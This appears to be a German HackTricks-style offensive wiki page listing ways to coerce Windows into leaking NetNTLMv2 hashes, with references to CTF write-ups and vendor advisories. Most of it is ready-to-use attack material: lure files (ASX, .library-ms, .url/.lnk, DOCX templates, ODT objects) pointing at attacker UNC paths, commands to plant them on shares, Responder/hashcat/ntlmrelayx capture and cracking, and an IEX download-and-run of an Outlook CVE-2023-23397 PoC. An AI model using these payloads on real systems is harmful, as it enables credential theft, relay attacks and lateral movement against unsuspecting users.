# Orte, an denen NTLM-Credentials gestohlen werden können

{{#include ../../banners/hacktricks-training.md}}

**Prüfe alle großartigen Ideen von [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), vom Herunterladen einer Microsoft-Word-Datei aus dem Internet bis zur NTLM-Leak-Quelle: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Beschreibbare SMB-Freigabe + durch Explorer ausgelöste UNC-Köder (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Wenn du **in eine Freigabe schreiben kannst, die Benutzer oder geplante Jobs im Explorer durchsuchen**, lege Dateien ab, deren Metadaten auf deinen UNC-Pfad verweisen (z. B. `\\ATTACKER\share`). Beim Anzeigen des Ordners wird **implizite SMB-Authentifizierung** ausgelöst, wodurch ein **NetNTLMv2-Hash** an deinen Listener geleakt wird.<sup>[[1]](#references)</sup>

1. **Köder generieren** (deckt SCF/URL/LNK/library-ms/desktop.ini/Office/RTF usw. ab)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Lege sie auf der beschreibbaren Freigabe ab** (in einem beliebigen Ordner, den das Opfer öffnet):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Mithören und cracken**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows kann mehrere Dateien gleichzeitig ansprechen; für alles, was Explorer in der Vorschau anzeigt (`BROWSE TO FOLDER`), sind keine Klicks nötig.

### Windows Media Player-Wiedergabelisten (.ASX/.WAX)

Wenn du ein Ziel dazu bringen kannst, eine von dir kontrollierte Windows Media Player-Wiedergabeliste zu öffnen oder in der Vorschau anzuzeigen, kannst du Net‑NTLMv2 leaken, indem du den Eintrag auf einen UNC-Pfad verweist. WMP versucht, die referenzierten Medien über SMB abzurufen, und authentifiziert sich dabei implizit.<sup>[[3]](#references)[[4]](#references)</sup>

Beispiel-Payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Sammel- und Cracking-Ablauf:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### In ZIP eingebetteter .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer verarbeitet .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Verweist die Bibliotheksdefinition auf einen Remote-UNC-Pfad (z. B. \\attacker\share), enumeriert Explorer beim bloßen Durchsuchen/Starten der .library-ms-Datei im ZIP den UNC-Pfad und sendet eine NTLM-Authentifizierung an den Angreifer. Dadurch erhält man einen NetNTLMv2-Hash, der offline geknackt oder möglicherweise weitergeleitet werden kann.<sup>[[2]](#references)</sup>

Minimale .library-ms-Datei mit Verweis auf einen UNC-Pfad des Angreifers

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Betriebsschritte
- Erstellen Sie die .library-ms-Datei mit dem obigen XML (legen Sie Ihre IP-Adresse/Hostnamen fest).
- ZIPpen Sie die Datei (unter Windows: Senden an → ZIP-komprimierter Ordner) und übermitteln Sie die ZIP-Datei an das Ziel.
- Starten Sie einen NTLM-Capture-Listener und warten Sie, bis das Opfer die .library-ms-Datei aus der ZIP-Datei öffnet.


### Soundpfad für Outlook-Kalendererinnerungen (CVE-2023-23397) – Zero-Click-Net-NTLMv2-leak

Microsoft Outlook für Windows verarbeitete die erweiterte MAPI-Eigenschaft PidLidReminderFileParameter in Kalenderelementen. Wenn diese Eigenschaft auf einen UNC-Pfad verweist (z. B. \\attacker\share\alert.wav), stellte Outlook beim Auslösen der Erinnerung eine Verbindung zur SMB-Freigabe her und leak-te die Net-NTLMv2-Anmeldedaten des Benutzers – ganz ohne Klick. Dieser Fehler wurde am 14. März 2023 behoben, ist aber für ältere/unveränderte Systeme und die historische Incident Response weiterhin äußerst relevant.<sup>[[5]](#references)</sup>

Schnelle Ausnutzung mit PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Listener-Seite:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Hinweise
- Auf dem Gerät des Opfers muss lediglich Outlook für Windows ausgeführt werden, wenn die Erinnerung ausgelöst wird.
- Das Leak liefert Net‑NTLMv2, das sich für Offline-Cracking oder Relay eignet (nicht für Pass-the-Hash).


### .LNK/.URL-Icon-basiertes Zero-Click-NTLM-Leak (CVE‑2025‑50154 – Umgehung von CVE‑2025‑24054)

Windows Explorer rendert Verknüpfungssymbole automatisch. Jüngste Forschungsergebnisse zeigten, dass sich auch nach dem Microsoft-Patch vom April 2025 für UNC-Symbolverknüpfungen weiterhin eine NTLM-Authentifizierung ohne Klicks auslösen ließ, indem das Verknüpfungsziel auf einem UNC-Pfad gehostet und das Symbol lokal gespeichert wurde (die Patch-Umgehung erhielt die Kennung CVE‑2025‑50154). Bereits das Anzeigen des Ordners veranlasst Explorer, Metadaten vom Remote-Ziel abzurufen und NTLM an den SMB-Server des Angreifers zu senden.<sup>[[6]](#references)</sup>

Minimale Internet-Shortcut-Payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Shortcut-Payload (.lnk) mit PowerShell programmieren:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Delivery-Ideen
- Lege die Verknüpfung in ein ZIP-Archiv und bringe das Opfer dazu, darin zu navigieren.
- Lege die Verknüpfung auf einer beschreibbaren Freigabe ab, die das Opfer öffnen wird.
- Kombiniere sie im selben Ordner mit anderen Köderdateien, damit Explorer die Elemente in der Vorschau anzeigt.

### No-click .LNK-NTLM-leak über den ExtraData-Icon-Pfad (CVE‑2026‑25185)

Windows lädt `.lnk`-Metadaten während der **Ansicht/Vorschau** (Symbol-Rendering), nicht nur bei der Ausführung. CVE‑2026‑25185 zeigt einen Parsing-Pfad, bei dem **ExtraData**-Blöcke die Shell dazu bringen, einen Icon-Pfad aufzulösen und **beim Laden** auf das Dateisystem zuzugreifen. Ist der Pfad remote, wird ausgehendes NTLM ausgelöst.

Wichtige Triggerbedingungen (beobachtet in `CShellLink::_LoadFromStream`):
- **DARWIN_PROPS** (`0xa0000006`) in ExtraData einfügen (Schalter für die Icon-Aktualisierungsroutine).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) mit befülltem **TargetUnicode** einfügen.
- Der Loader expandiert Umgebungsvariablen in `TargetUnicode` und ruft `PathFileExistsW` für den resultierenden Pfad auf.

Wird `TargetUnicode` zu einem UNC-Pfad aufgelöst (z. B. `\\attacker\share\icon.ico`), löst **bereits das Anzeigen eines Ordners** mit der Verknüpfung eine ausgehende Authentifizierung aus. Derselbe Ladepfad kann auch durch **Indizierung** und **AV-Scanning** ausgelöst werden, was eine praktische No-click-leak-Angriffsfläche darstellt.<sup>[[7]](#references)</sup>

Im Projekt **LnkMeMaybe** sind Research-Tools (Parser/Generator/UI) verfügbar, mit denen sich diese Strukturen erstellen und untersuchen lassen, ohne die Windows-GUI zu verwenden.<sup>[[8]](#references)</sup>


### WebDAV-Authentifizierung erzwingen / Anmeldedaten über `davclnt.dll,DavSetCookie` validieren

Der native **WebDAV-Client** kann missbraucht werden, um die aktuelle Anmeldesitzung zu einer Authentifizierung bei einem beliebigen **HTTP/WebDAV**-Endpunkt zu zwingen:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Warum das nützlich ist:
- Gegen einen **angreifergesteuerten WebDAV-Server** kann es **NTLM über HTTP** auslösen, ohne einen benutzerdefinierten Client abzulegen.
- Gegen **interne Hosts** ist es eine unauffällige Möglichkeit zu **überprüfen, wo gestohlene Anmeldedaten akzeptiert werden**, bevor man sich lateral weiterbewegt.<sup>[[9]](#references)</sup>
- Der Befehl ist eine gute Alternative, wenn **SMB-Egress gefiltert** wird, **HTTP/WebDAV** aber weiterhin erreichbar ist.

Hinweise zum Betrieb:
- Der **WebClient**-Dienst muss auf dem Quellhost laufen.
- `rundll32.exe` lädt `davclnt.dll` und lässt Windows die WebDAV-Authentifizierung mit den **Anmeldedaten des aktuellen Benutzers** durchführen.<sup>[[10]](#references)</sup>
- Wenn Sie auf eine Infrastruktur verweisen, die Sie kontrollieren, verwenden Sie einen NTLM-fähigen HTTP-Listener/Relay wie:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Aus Sicht der Erkennung sind wiederholte Ausführungen von `rundll32.exe davclnt.dll,DavSetCookie` gegen viele interne Systeme ein starkes Signal für **Credential-Validierung / Vorbereitung lateral movement mit spray-ähnlichem Verhalten** statt für normales Benutzerverhalten.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm), um NTLM zu erzwingen

Office-Dokumente können auf eine externe Vorlage verweisen. Wenn Sie die angefügte Vorlage auf einen UNC-Pfad setzen, authentifiziert sich das Öffnen des Dokuments bei SMB.

Minimale Änderungen an DOCX-Beziehungen (innerhalb von word/):

1) Bearbeiten Sie word/settings.xml und fügen Sie den Verweis auf die angefügte Vorlage hinzu:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Bearbeite word/_rels/settings.xml.rels und verweise rId1337 auf deinen UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Wieder zu .docx packen und ausliefern. Starte deinen SMB-Capture-Listener und warte, bis das Dokument geöffnet wird.

### Externes ODT-Objekt für SMB-Authentifizierung

Wenn ein Dokument-Upload-Pfad `.odt` akzeptiert, das Ziel aber keine Office-`.docx`-Dateien öffnet, verwende statt einer Office-Vorlage ein externes OpenDocument-Objekt. Metasploits `auxiliary/fileformat/odt_badodt` erzeugt ein ODT, dessen `content.xml` eine `draw:object`-Referenz enthält, die beim Laden ausgeführt wird, wie die folgende. Setze `LHOST` auf den SMB-Listener, lade das ODT über den zulässigen Workflow hoch und fange die ausgehende NetNTLMv2-Antwort ab, wenn ein Benutzer oder Dokumentprozessor es öffnet. Eine Prüfung der Dateiendung untersucht diese eingebettete URL nicht; eingehende NTLM-Beschränkungen auf dem Ziel verhindern nicht unbedingt die ausgehende Authentifizierung.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Für Ideen zur Weiterleitung oder zum Missbrauch von NTLM nach dem Capture siehe:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Köder über beschreibbare Freigaben + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP-.library‑ms-auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 zu DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP-NTLM-leak → NTFS-Junction zum Webroot-RCE → FullPowers + GodPotato zu SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM-Schwachstellen: Ungepatchte Bedrohungen durch Rechteausweitung bei Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigiert Outlook-EoP (CVE‑2023‑23397) und erklärt den NTLM-leak über PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-Click, ein NTLM: Umgehung des Microsoft-Sicherheitspatches (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Ein Überblick über CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe-Tools](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Wenn der IT-Support anruft: Eine Analyse einer ModeloRAT-Kampagne von Teams bis zur Kompromittierung der Domäne](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h-Header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows-Rundll32-WebDAV-Anfrage](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com – Interessante Orte zum Stehlen von Netntlm-Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — NTLM-Capture über externe ODT-Objekte](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
